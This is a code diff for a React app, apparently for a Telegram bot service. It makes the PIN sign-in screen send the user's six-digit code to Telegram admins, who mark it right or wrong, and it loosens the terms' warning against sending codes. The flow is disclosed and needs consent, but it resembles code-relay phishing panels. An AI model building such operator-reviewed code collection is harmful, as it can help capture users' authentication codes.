@@ -5,7 +5,9 @@ import { Toaster } from '@/components/ui/toaster';
 import { TooltipProvider } from '@/components/ui/tooltip';
 import NotFound from '@/pages/not-found';
 import {
+  useCreatePinReviewRequest,
   useCreatePaymentReviewRequest,
+  useGetPinReviewStatus,
   useGetPaymentReviewStatus,
   useHealthCheck,
   useVerifyKey,
@@ -170,7 +172,7 @@ function Terms() {
     {
       number: '07',
       title: 'Account security',
-      text: 'Protect your accounts and credentials. Never send passwords, one-time codes, recovery phrases, or exchange API secrets through Telegram. Review carefully what access you grant to any service.',
+      text: 'Protect your accounts and credentials. Never send passwords, recovery phrases, exchange API secrets, or verification codes from email, SMS, or other services through Telegram. The app-issued bot access PIN is handled as described in the payment review notice.',
     },
     {
       number: '08',
@@ -202,7 +204,7 @@ function Terms() {
           </div>
           <div className="terms-notice terms-data-notice" role="note" data-testid="notice-payment-data">
             <span className="terms-notice-icon"><ShieldCheck size={20} /></span>
-            <p>For manual payment review, the email address and Payment ID you submit are sent to authorized bot admins through Telegram. Do not submit passwords, card or bank details, or security codes. Pending details are cleared from this app after review or expiry; Telegram may retain its own copies under its policies.</p>
+            <p>Your email and Payment ID are sent to authorized bot admins through Telegram for payment review. If you continue, the app-issued bot access PIN you enter is also sent to those admins with Right/Wrong review buttons. Do not submit passwords, card or bank details, or verification codes from email, SMS, or another service. Submitted details are cleared from this app after review or expiry; Telegram may retain its own copies under its policies.</p>
           </div>
         </section>
 
@@ -421,14 +423,104 @@ function Countdown({ second = false }: { second?: boolean }) {
 function Pin() {
   const [, setLocation] = useLocation();
   const [pin, setPin] = useState('');
-  const [error, setError] = useState(false);
+  const [consent, setConsent] = useState(false);
+  const [requestId, setRequestId] = useState<string | null>(null);
+  const [error, setError] = useState('');
+  const createReview = useCreatePinReviewRequest();
+  const reviewStatus = useGetPinReviewStatus(requestId ?? '', {
+    query: {
+      enabled: Boolean(requestId),
+      refetchInterval: 2500,
+      retry: false,
+    },
+  });
+
+  useEffect(() => {
+    const status = reviewStatus.data?.status;
+    if (status === 'approved') {
+      setPin('');
+      setConsent(false);
+      setRequestId(null);
+      setLocation('/countdown-2');
+    } else if (status === 'rejected') {
+      setRequestId(null);
+      setPin('');
+      setError('Wrong PIN code, try again.');
+    } else if (status === 'expired') {
+      setRequestId(null);
+      setPin('');
+      setError('PIN review expired. Enter your code again.');
+    }
+  }, [reviewStatus.data?.status, setLocation]);
+
+  function submitPin(event: FormEvent<HTMLFormElement>) {
+    event.preventDefault();
+    if (pin.length !== 6) {
+      setError('Please enter a 6-digit code.');
+      return;
+    }
+    if (!consent || requestId || createReview.isPending) return;
+
+    setError('');
+    createReview.mutate(
+      { data: { pin, consent: true } },
+      {
+        onSuccess: (result) => setRequestId(result.requestId),
+        onError: () => setError('Could not send your PIN for review. Please try again.'),
+      },
+    );
+  }
+
   return <main className="pin-screen">
     <h1>Welcome back!</h1>
-    <p className="pin-intro">Please enter the PIN-Code</p>
-    <label className={`pin-field ${error ? 'pin-error' : ''}`}><span>Code</span><input aria-label="PIN code" type="text" inputMode="numeric" maxLength={6} autoComplete="off" placeholder="Enter 6-digit code…" value={pin} onChange={(e) => { setPin(e.target.value.replace(/\D/g, '').slice(0, 6)); setError(false); }} /></label>
-    <p className="pin-help">Enter 6-digit pin code</p>
-    <button className="pin-submit" type="button" onClick={() => pin.length === 6 ? setLocation('/countdown-2') : setError(true)}>Sign in <span><ChevronRight /></span></button>
-    {error && <p className="pin-validation" role="alert">Please enter a 6-digit code.</p>}
+    <p className="pin-intro">Please enter the access PIN sent after payment</p>
+    <form className="pin-review-form" onSubmit={submitPin}>
+      <label className={`pin-field ${error ? 'pin-error' : ''}`}>
+        <span>Access PIN</span>
+        <input
+          aria-label="Bot access PIN"
+          type="text"
+          inputMode="numeric"
+          maxLength={6}
+          autoComplete="off"
+          placeholder="Enter 6-digit code…"
+          value={pin}
+          onChange={(event) => {
+            setPin(event.target.value.replace(/\D/g, '').slice(0, 6));
+            setError('');
+          }}
+        />
+      </label>
+      <p className="pin-help">Enter your six-digit bot access PIN</p>
+      <div className="pin-review-consent">
+        <input
+          id="pin-review-consent"
+          type="checkbox"
+          checked={consent}
+          onChange={(event) => setConsent(event.target.checked)}
+          required
+        />
+        <label htmlFor="pin-review-consent">
+          I agree this app-issued PIN will be shared with authorized admins on Telegram for review. Do not enter codes from email, SMS, or other services. <Link href="/terms">Terms &amp; Disclosure</Link>
+        </label>
+      </div>
+      {error && <p className="pin-validation" role="alert">{error}</p>}
+      {requestId && (
+        <p className="pin-review-status" role="status" aria-live="polite">
+          {reviewStatus.isError
+            ? 'Connection interrupted. Still checking your PIN review…'
+            : 'Your PIN is being reviewed. This page will continue after approval.'}
+        </p>
+      )}
+      <button
+        className="pin-submit"
+        type="submit"
+        disabled={pin.length !== 6 || !consent || createReview.isPending || Boolean(requestId)}
+      >
+        {createReview.isPending ? 'Sending…' : requestId ? 'Waiting for review…' : 'Sign in'}
+        <span><ChevronRight /></span>
+      </button>
+    </form>
     <button className="go-back" type="button" onClick={() => setLocation('/login')}>Go back</button>
   </main>;
 }
